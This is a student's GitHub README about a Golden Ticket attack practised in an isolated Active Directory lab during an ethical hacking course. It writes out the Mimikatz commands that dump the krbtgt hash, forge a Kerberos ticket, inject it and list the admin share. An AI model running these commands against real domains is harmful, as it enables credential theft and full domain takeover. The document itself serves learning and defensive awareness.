# 🛡️ Active Directory Golden Ticket Lab – TCM Security

![Windows Server](https://img.shields.io/badge/Windows%20Server-2019-blue?style=for-the-badge&logo=windows)
![Active Directory](https://img.shields.io/badge/Active%20Directory-Lab%20Environment-red?style=for-the-badge)
![Mimikatz](https://img.shields.io/badge/Mimikatz-Post%20Exploitation-darkred?style=for-the-badge)
![Kerberos](https://img.shields.io/badge/Kerberos-Golden%20Ticket-gold?style=for-the-badge)
![Ethical Hacking](https://img.shields.io/badge/Ethical%20Hacking-TCM%20Security-black?style=for-the-badge)

---

## 📌 Overview

This repository contains notes, screenshots, commands, and observations from my private VMware-based Active Directory lab while following the **TCM Security Ethical Hacking** course.

The purpose of this lab is educational and focused entirely on understanding:

- Active Directory environments
- Kerberos authentication
- Post-exploitation techniques
- Credential abuse concepts
- Golden Ticket attacks
- Domain persistence mechanisms
- Detection & defensive awareness

All activities were performed inside an isolated and authorized lab environment.

---

# 🧠 Lab Environment

## Infrastructure

| Component         | Description     |
| ----------------- | --------------- |
| Attacker Machine  | Kali Linux      |
| Domain Controller | HYDRA-DC        |
| Workstation       | THEPUNISHER-WIN |
| Domain            | MARVEL.local    |
| Virtualization    | VMware          |

---

# 🔐 Topics Covered

- Active Directory Enumeration
- Credential Dumping
- Mimikatz Usage
- LSASS Memory Access
- Kerberos Authentication
- KRBTGT Hash Extraction
- Golden Ticket Creation
- Pass-The-Ticket (PTT)
- Administrative Share Access
- Lateral Movement Concepts

---

# ⚙️ Tools Used

| Tool       | Purpose                                              |
| ---------- | ---------------------------------------------------- |
| Mimikatz   | Credential extraction & Kerberos ticket manipulation |
| PsExec     | Remote administration & execution concepts           |
| Impacket   | Remote authentication & NTDS-related operations      |
| VMware     | Isolated lab virtualization                          |
| Kali Linux | Attacker platform                                    |

---

# 🧪 Golden Ticket Attack Summary

During this phase of the lab:

- Extracted the `krbtgt` NTLM hash from the Domain Controller
- Generated a forged Kerberos Golden Ticket
- Injected the ticket into the current session using Pass-The-Ticket (PTT)
- Verified domain-level administrative access through SMB administrative shares

Example concepts explored:

- Kerberos trust model
- Ticket signing
- Domain persistence
- Authentication abuse
- Lateral movement theory

---

# 🖥️ Sample Commands Practiced

```bash
privilege::debug

```

```bash
lsadump::lsa /inject /name:krbtgt
```

```bash
kerberos::golden /User:<USERNAME> /domain:<DOMAIN.C> /sid:<DOMAIN_SID> /krbtgt:<HASH> /id:500 /ptt
```

klist

```bash
dir \\<MACHINE-NAME>>\c$
```

# ⚠️ Disclaimer

This repository is strictly for:

- Educational purposes
- Defensive security research
- Ethical hacking practice
- Authorized lab simulations

No unauthorized systems, networks, or real-world targets were involved.

---

# 📚 Learning Platform

- TCM Security Ethical Hacking Course
- Active Directory Attack & Defense Concepts
- Kerberos Authentication Internals

---

# 🚀 Current Progress

✅ Credential Dumping
✅ KRBTGT Extraction
✅ Golden Ticket Generation
✅ Pass-The-Ticket Injection
✅ SMB Administrative Access Verification

⏳ Next Phase:

- NTDS.dit Operations
- Advanced Lateral Movement
- Persistence Techniques
- Detection & Defense Analysis

---

# 👨‍💻 Author

Hunzla Bilal
Barcelona, Spain

- 🔗 LinkedIn: https://www.linkedin.com/in/hunzla-bilal

---

> “Understanding how attacks work is essential for building stronger defenses.”
